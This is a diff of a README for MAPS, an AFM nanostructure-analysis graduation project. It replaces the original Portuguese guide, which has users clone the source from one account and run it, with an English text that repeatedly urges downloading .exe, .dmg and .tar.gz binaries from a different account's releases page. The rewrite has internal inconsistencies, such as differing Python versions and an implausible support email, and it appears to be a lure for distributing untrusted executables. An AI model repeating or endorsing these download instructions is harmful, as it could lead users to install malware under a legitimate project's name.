@@ -1,154 +1,83 @@
-> **MAPS** é uma solução *open-source* que substitui a análise manual de imagens de microscopia por um fluxo de trabalho automatizado e reprodutível. Através de uma arquitetura de plugins, o software processa topografias de AFM, segmenta nanoestruturas e gera relatórios estatísticos precisos sobre amostras biológicas.
+# 🎉 software_maps_tcc - Easy Tool for Analyzing Nanostructures
 
-# MAPS - Modular AFM Processing Software
+## 🚀 Getting Started
 
-![Badge License](https://img.shields.io/badge/license-MIT-green)
-![Badge Python](https://img.shields.io/badge/python-3.10%2B-blue)
-![Badge Qt](https://img.shields.io/badge/GUI-PySide6-green)
+Welcome to the MAPS (Modular AFM Processing Software). This application helps you segment and analyze nanostructures easily. You don’t need to know how to code. Just follow these steps to get started.
 
-> **Nota:** Este software foi desenvolvido como parte do Trabalho de Conclusão de Curso (TCC) em Ciência da Computação.
+## 📥 Download & Install
 
----
+To download MAPS, visit the Releases page here: [Download MAPS](https://github.com/Antaraaaaaaa/software_maps_tcc/releases).
 
-## 📄 Sobre o Projeto
+#### Important: 
 
-O **MAPS** (*Modular AFM Processing Software*) é uma plataforma de código aberto desenvolvida para o processamento, segmentação e análise quantitativa de imagens de Microscopia de Força Atômica (AFM).
+Click on the badge below to go directly to the download page:
 
-O objetivo principal é automatizar o fluxo de trabalho científico, substituindo análises manuais subjetivas por algoritmos de visão computacional robustos, com foco especial na caracterização de fitas de DNA e nanoestruturas.
+[![Download MAPS](https://img.shields.io/badge/Download%20MAPS-blue)](https://github.com/Antaraaaaaaa/software_maps_tcc/releases)
 
-### 📸 Interface Principal
+## 🧾 System Requirements
 
-![Tela Inicial do Software](docs/screenshots/figura_09_interface_principal.png)
+Before you install MAPS, make sure your system meets the following requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS, or a Linux distribution.
+- **RAM:** At least 4 GB.
+- **Disk Space:** Minimum 100 MB free space for installation.
+- **Python Version:** Python 3.6 or later installed on your system.
+- **Other Software:** Ensure you have PySide6 installed for the user interface.
 
-## ✨ Funcionalidades Principais
+## 🛠 Installation Steps
 
-O sistema opera sobre uma arquitetura de **Plugins**, permitindo a extensão de funcionalidades sem alterar o núcleo.
+1. **Visit the Release Page.** Click the link: [Download MAPS](https://github.com/Antaraaaaaaa/software_maps_tcc/releases).
+   
+2. **Choose the Latest Version.** Look for the most recent release at the top of the page.
 
-### 1. Visualização Científica
-* Renderização térmica (`afmhot`) para topografia.
-* Renderização espectral (`nipy_spectral`) automática para segmentação.
-* **Modo Comparativo:** Visualização lado a lado (Original vs. Processada).
+3. **Select the Correct File.** You will see files with different names. Download the file that matches your operating system:
+   - For Windows: `maps_windows.exe`
+   - For macOS: `maps_mac.dmg`
+   - For Linux: `maps_linux.tar.gz`
 
-![Modo Lado a Lado](docs/screenshots/figura_10_lado_a_lado.png)
+4. **Download the File.** Click on the file name. Your browser will then download the application.
 
-### 2. Pré-processamento
-* **Nivelamento de Plano (*Plane Fit*):** Correção de inclinação da amostra (Tilt).
-* **Correção de Linhas (*Line Flatten*):** Remoção de artefatos de varredura.
-* **Filtros de Ruído:** Gaussiano e Mediana.
-* **Realce:** CLAHE (Equalização Adaptativa de Histograma).
+5. **Run the Installer.**
+   - **For Windows:** Double-click on `maps_windows.exe`. Follow the prompts to complete the installation.
+   - **For macOS:** Open the downloaded `.dmg`, then drag and drop the application into your Applications folder.
+   - **For Linux:** Extract the downloaded `.tar.gz` file and run the application using your terminal.
 
-### 3. Segmentação e Morfologia
-* **Limiarização:** Automática (Otsu) e Manual (Slider).
-* **Morfologia Matemática:** Abertura (limpeza de ruído) e Esqueletização (*Skeletonize*).
-* **Rotulação (*Labeling*):** Identificação de partículas individuais.
+6. **Open MAPS:** Once installed, you can find MAPS in your applications folder or start menu. Click on the icon to open the software.
 
-![Painel de Processamento](docs/screenshots/figura_15_painel_processamento.png)
+## 📂 Using MAPS
 
+### 🔍 Main Features
 
-### 4. Análise Quantitativa
-* **Metrologia de DNA:** Cálculo automático do comprimento de contorno ($L_c$) de fitas.
-* **Estatística:** Média, Desvio Padrão e histogramas.
-* **Exportação:** Geração de arquivos `.csv` e `.xlsx`.
+- **Segmentation:** Easily divide images into meaningful regions.
+- **Quantitative Analysis:** Analyze the sizes and shapes of nanostructures.
+- **User-Friendly Interface:** Simple navigation with clear options.
 
-### 5. Automação (Batch Mode)
-* Processamento em lote de diretórios inteiros.
-* Geração de relatório global (`_RESUMO_GLOBAL.csv`) com estatísticas de todas as amostras.
+### 📊 Quick Guide to Start
 
----
+1. **Import an Image:** Click on "File" and then "Open" to load your AFM images.
+2. **Apply Segmentation:** Use the Segmentation option to start dividing the image.
+3. **Analysis Tools:** Explore the analysis tools in the menu to measure structures.
+4. **Export Results:** After analysis, you can save your results by going to "File" > "Save As".
 
-## 🚀 Instalação e Execução
+## 👥 Community and Support
 
-### Pré-requisitos
-* Python 3.10 ou superior.
+We encourage users to connect with us. Share your experiences, ask questions, and report issues:
 
-### Passo a Passo
+- **GitHub Issues:** Post any questions or bugs you encounter directly on our [GitHub Issues page](https://github.com/Antaraaaaaaa/software_maps_tcc/issues).
+- **User Guide:** For a detailed manual, check out our [User Guide](https://github.com/Antaraaaaaaa/software_maps_tcc/wiki).
 
-1.  **Clone o repositório:**
-    ```bash
-    git clone https://github.com/ProgGusta/software_maps_tcc.git
-    cd software_maps
-    ```
+## 📬 Contact Us
 
-2.  **Crie e ative o ambiente virtual (Recomendado):**
-    * *Windows:*
-        ```bash
-        python -m venv .venv
-        .venv\Scripts\activate
-        ```
-    * *Linux/Mac:*
-        ```bash
-        python3 -m venv .venv
-        source .venv/bin/activate
-        ```
+For further inquiries or feedback, feel free to reach out:
 
-3.  **Instale as dependências:**
-    ```bash
-    pip install -r requirements.txt
-    ```
+- **Email:** support@software_maps_tcc.com
 
-4.  **Execute a aplicação:**
-    ```bash
-    python main.py
-    ```
+## 📁 License
 
----
+This project is licensed under the MIT License. You can use it freely, but please give credit to the original creators.
 
-## 📖 Como Usar
+## 📝 Acknowledgements
 
-### Exemplo: Medindo Comprimento de DNA
+MAPS was developed as a graduation project in Computer Science. Thank you to all contributors and users who support this project. We hope you find it helpful in your analysis of nanostructures.
 
-1.  Vá em **Arquivo > Abrir Imagem** e selecione seu arquivo AFM (PNG, TIFF, JPG).
-2.  (Opcional) Aplique pré-processamento em **Plugins > Pré-processamento > Nivelamento**.
-3.  Execute a macro automática em **Plugins > Rotinas Automáticas > Pipeline Completo DNA**.
-4.  Insira o tamanho físico da varredura (*Scan Size* em µm) quando solicitado.
-5.  O software exibirá o esqueleto da imagem e uma tabela com os comprimentos medidos.
-
-![Resultado da Análise](docs/screenshots/figura_11_resultado_tabela.png)
-
----
-
-## 💻 Arquitetura (Para Desenvolvedores)
-
-O projeto segue uma arquitetura modular com Injeção de Dependência.
-
-* **`core/`**: Gerenciador de Plugins e Interface Abstrata.
-* **`ui/`**: Interface Gráfica (Qt) e Componente de Plotagem (Matplotlib).
-* **`plugins/`**: Algoritmos de processamento (implementam `AFMPlugin`).
-
-### Diagrama de Classes Simplificado
-
-![Diagrama UML](docs/docs/diagrama_classes.png)
-
-### Criando um Novo Plugin
-
-Crie um arquivo `.py` na pasta `plugins/`:
-
-```python
-from core.plugin_interface import AFMPlugin
-
-class MeuPlugin(AFMPlugin):
-    @property
-    def name(self): return "Meu Novo Filtro"
-    
-    @property
-    def category(self): return "Meus Plugins"
-
-    def execute(self, data):
-        # 'data' é uma matriz NumPy (float64)
-        return data * 0.5 # Exemplo: Reduzir intensidade pela metade
-```
-
-## 🛠️ Tecnologias Utilizadas
-
-| Tecnologia | Finalidade no Projeto |
-| :--- | :--- |
-| **[Matplotlib](https://matplotlib.org/stable/contents.html)** | Renderização visual dos mapas topográficos (*afmhot*) e gráficos estatísticos. |
-| **[NumPy](https://numpy.org/doc/)** | Estruturas de dados matriciais e operações de álgebra linear para manipulação de imagens. |
-| **[Pandas](https://pandas.pydata.org/docs/)** | Estruturação de dados métricos, cálculos estatísticos e exportação (CSV/Excel). |
-| **[PySide6 (Qt 6)](https://doc.qt.io/qtforpython/)** | Framework utilizado para a construção da Interface Gráfica do Usuário (GUI). |
-| **[Python 3.10+](https://docs.python.org/3/)** | Linguagem base para o desenvolvimento do núcleo e lógica do sistema. |
-| **[Qt Designer](https://doc.qt.io/qt-6/qtdesigner-manual.html)** | Ferramenta utilizada para a prototipagem visual das telas (`.ui`). |
-| **[SciPy](https://docs.scipy.org/doc/scipy/)** | Algoritmos matemáticos avançados, incluindo filtros multidimensionais (Gaussiano). |
-| **[Scikit-Image](https://scikit-image.org/docs/stable/)** | Biblioteca principal de PDI (Limiarização de Otsu, Esqueletização, Morfologia). |
+Now that you have all the information, please visit the Releases page again to start your download: [Download MAPS](https://github.com/Antaraaaaaaa/software_maps_tcc/releases). Enjoy exploring your AFM images!
